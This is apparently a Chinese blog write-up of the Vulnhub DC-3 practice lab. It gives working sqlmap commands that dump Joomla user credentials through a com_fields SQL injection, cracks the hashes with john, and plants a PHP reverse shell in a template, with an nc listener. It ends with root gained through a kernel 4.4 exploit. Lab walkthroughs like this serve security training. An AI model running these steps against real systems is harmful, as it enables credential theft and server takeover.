---
title: DC-3
tags:
  - Vulnhub
  - DC-3
categories: 
  - 渗透靶机训练
typora-root-url: DC-3
description: A bit hard DC-3 Challenge
excerpt: A bit hard DC-3 Challenge
abbrlink: 25016
date: 2021-03-24 23:17:09
---

# DC-3

> 这个靶机有点难搞，尤其是最后提权

## 基础信息收集

先使用NMAP扫描了一下：

![image-20210324233801085](image-20210324233801085.png)

得到一个关键信息，即后台是**Joomla**。

相比之下，nikto就没有带来太多有用的信息了，不过倒是给我们爆出了许多目录：

![image-20210324234001366](image-20210324234001366.png)

## 基于Joomla深入

知道了后台是Joomla后，首先判断一下Joomla的版本：

```bash
joomscan -u 192.168.145.136
```

**joomscan**是Kali里有的，一开始不知道还去github找了下。

关键信息如下：

![image-20210324234206504](image-20210324234206504.png)

然后搜一下这个版本是否存在漏洞，居然搜出来一个SQL注入：

![image-20210324234307736](image-20210324234307736.png)

找到sqlmap 用法：

![image-20210324234415324](image-20210324234415324.png)

## SQL注入

由于**exploit-db**已经提供了**sqlmap**的用法，因此后面的步骤相对简单，使用sqlmap跑出数据库：

```bash
sqlmap -u "http://192.168.145.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dbs
```



![image-20210324234645951](image-20210324234645951.png)

跑出数据库**joomladb**的表：

```bash
sqlmap -u "http://192.168.145.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables
```

![image-20210324235005327](image-20210324235005327.png)

跑出user表：

```bash
sqlmap -u "http://192.168.145.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns
```

![image-20210324235335128](image-20210324235335128.png)

然后再爆出username和password：

```bash
sqlmap -u "http://192.168.145.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password --dump
```

![image-20210324235452765](image-20210324235452765.png)

然后使用**john**破一下hash密码：

```bash
john --crack-status pwd.hash
```

由于我已经crack过了，这里展示一下结果：

![image-20210324235726459](image-20210324235726459.png)

然后通过这个登录到系统。

## Joomla后台

![image-20210324235813269](image-20210324235813269.png)

经Google，Joomla的模板可以修改。

在**beez3**模板的根目录下加一个shell的php文件，这个文件的内容可以参考：

```bash
/usr/share/webshells/php/php-reverse-shell.php
```

我这里用的就是这个。

稍微修改一下内容：

![image-20210325000142914](image-20210325000142914.png)

将IP改为自己主机的IP。

保存后访问的地址为：http://192.168.145.136/templates/beez3/shell.php

如果修改的是另一个模板，那就把beez3换成模板名。

在访问之前，在自己的主机上开一个端口监听接受反弹shell：

```bash
nc -nvlp 1234
```

然后访问该地址，成功拿到反弹shell：

![image-20210325000321124](image-20210325000321124.png)

## 提权

这里的提权折腾了很久，思维固定在DC-1和DC-2的类似提权手法，浪费了许多时间。

![image-20210325000422798](image-20210325000422798.png)

根据连接信息可以判断Linux版本，然后判断Ubuntu版本：

![image-20210325000515777](image-20210325000515777.png)

搜索一下：

```bash
searchsploit linux kernel 4.4
```

![image-20210325000836006](image-20210325000836006.png)

完美符合所有条件。

在exploit-db上找用法，然后：

去这个地址下载**exploit.tar**：[https://bugs.chromium.org/p/project-zero/issues/detail?id=808](https://bugs.chromium.org/p/project-zero/issues/detail?id=808)

然后全部传到DC-3的服务器上，如果网络环境运行可以直接在服务器上wget从Github下。

然后编译执行：

![image-20210325002900300](image-20210325002900300.png)

成功拿到Root权：

![image-20210325003610992](image-20210325003610992.png)